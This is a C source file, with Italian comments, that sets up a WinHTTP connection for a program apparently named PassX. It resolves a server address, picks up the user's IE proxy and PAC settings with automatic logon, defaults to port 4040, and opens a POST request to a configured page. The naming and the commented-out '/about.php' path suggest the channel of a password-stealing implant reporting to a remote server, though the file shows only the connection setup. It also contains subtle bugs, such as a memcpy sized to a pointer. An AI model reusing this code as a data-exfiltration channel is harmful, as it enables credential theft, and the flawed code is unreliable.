#include "PassX.h"
#include <Winhttp.h>
#include <strsafe.h>
#include "Utils.h"
#include "WinHttp.h"

#pragma comment(lib,"Winhttp.lib")

WCHAR *g_StrServerURL = NULL;
HINTERNET g_hSession = 0;
HINTERNET g_hConnect = 0;
HINTERNET g_hInternet = 0;

BOOLEAN ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
{
	struct hostent *hAddress;
	PBYTE pAddrPtr;
	WORD wVersionRequested;
	WSADATA pWSAData;

	// E' gia' un indirizzo IP
	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
	{
		_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pServerUrl);
		return TRUE;
	}

	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &pWSAData )!= 0)
	{
#ifdef _DEBUG
		OutputDebugString(L"WSAStartup FAILED\n");
		__asm int 3;
#endif
		return FALSE;
	}

	hAddress = gethostbyname((PCHAR)pServerUrl);
	WSACleanup();

	if (!hAddress || !(pAddrPtr = (PBYTE)inet_ntoa(*(struct in_addr*)hAddress->h_addr)))
	{
#ifdef _DEBUG
		OutputDebugString(L"inet_ntoa or gethostbyname FAILED\n");
		__asm int 3;
#endif
		return FALSE;
	}

	_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pAddrPtr);

	return TRUE;
}
BOOLEAN WinHttpSetup(PBYTE pServerUrl,PBYTE pAddrToConnect,ULONG ulBufLen,PULONG pPortToConnect)
{
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG pProxyConfig;
	WINHTTP_PROXY_INFO pProxyInfoTemp,pProxyInfo;
	WINHTTP_AUTOPROXY_OPTIONS pOptPAC;
	WCHAR wHost[MAX_PATH];
	WCHAR wHostProto[MAX_PATH];
	BOOLEAN bIsProxy;
	PBYTE pAddrPtr;
	char *wTypes[] = { "*\x00/\x00*\x00", 0x0 };

	bIsProxy = FALSE;
	RtlZeroMemory(wHost,sizeof(WCHAR) * MAX_PATH);
	RtlZeroMemory(wHostProto,sizeof(WCHAR) * MAX_PATH);
	RtlZeroMemory(&pProxyInfo,sizeof(WINHTTP_PROXY_INFO));
	RtlZeroMemory(&pProxyConfig,sizeof(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG));

	StringCchPrintf(wHost,MAX_PATH,L"%S",pServerUrl);
	StringCchPrintf(wHost,MAX_PATH,L"http://%S",pServerUrl);

	g_hSession = WinHttpOpen(USER_AGENT,WINHTTP_ACCESS_TYPE_NO_PROXY,0,WINHTTP_NO_PROXY_BYPASS,0);
	if (g_hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig))
	{
		if (pProxyConfig.lpszProxy)
		{
			pProxyInfo.lpszProxy = pProxyConfig.lpszProxy;
			pProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			pProxyInfo.lpszProxyBypass = NULL;
		}

		if (pProxyConfig.lpszAutoConfigUrl)
		{
			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
			pOptPAC.lpszAutoConfigUrl = pProxyConfig.lpszAutoConfigUrl;
			pOptPAC.dwAutoDetectFlags = 0;
			pOptPAC.fAutoLogonIfChallenged = TRUE;
			pOptPAC.lpvReserved = 0;
			pOptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(g_hSession,wHost,&pOptPAC,&pProxyInfoTemp))
			{
				memcpy(&pProxyInfo,&pProxyInfoTemp,sizeof(&pProxyInfoTemp));
			}
		}

		if (pProxyConfig.fAutoDetect)
		{
			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
			pOptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
			pOptPAC.fAutoLogonIfChallenged = TRUE;
			pOptPAC.lpszAutoConfigUrl = NULL;
			pOptPAC.lpvReserved = 0;
			pOptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(g_hSession,wHost,&pOptPAC,&pProxyInfoTemp))
			{
				memcpy(&pProxyInfo,&pProxyInfoTemp,sizeof(&pProxyInfoTemp));
			}
		}

		if (pProxyInfo.lpszProxy)
		{
			bIsProxy = TRUE;
			WinHttpSetOption(g_hSession,WINHTTP_OPTION_PROXY,&pProxyInfo,sizeof(pProxyInfo));
			_snprintf_s((PCHAR)pAddrToConnect, ulBufLen, _TRUNCATE, "%S", pProxyInfo.lpszProxy);
			if (pAddrPtr = (PBYTE)strchr((PCHAR)pAddrToConnect, (int)':')) 
			{
				*pAddrPtr = 0;
				pAddrPtr++;
				sscanf_s((PCHAR)pAddrPtr, "%d", pPortToConnect);
			} 
			else
			{
				*pPortToConnect = 8080;
			}

			if (!ResolveName(pAddrToConnect,pAddrToConnect,ulBufLen))
			{
#ifdef _DEBUG
				OutputDebugString(L"[!!] Cannot resolve name !\n");
				__asm int 3;
#endif
				WinHttpCloseHandle(g_hSession);
				return FALSE;
			}
		}
	}
	if (FALSE == bIsProxy)
	{
		//*pPortToConnect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80
		*pPortToConnect = 4040;
		if (!ResolveName(pServerUrl,pAddrToConnect,ulBufLen))
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] Cannot resolve name 2\n");
			__asm int 3;
#endif
			return FALSE;
		}
		swprintf_s(wHost, L"%S", pAddrToConnect); // In questo caso mette nella richiesta winhttp direttamente l'indirizzo IP
	}
	// Definisce il target
	if (!(g_hConnect = WinHttpConnect(g_hSession,(LPCWSTR)wHost,INTERNET_DEFAULT_HTTP_PORT,0)))
		return FALSE;

	//if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", L"/about.php", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
	if (!(g_hInternet = WinHttpOpenRequest(g_hConnect,L"POST",POST_PAGE,NULL,WINHTTP_NO_REFERER,(LPCWSTR *)wTypes,0)))
	{
		WinHttpCloseHandle(g_hSession);
		return FALSE;
	}

	WinHttpSetTimeouts(g_hInternet,RESOLVE_TIMEOUT,CONNECT_TIMEOUT,SEND_TIMEOUT,RECV_TIMEOUT);
	return TRUE;
}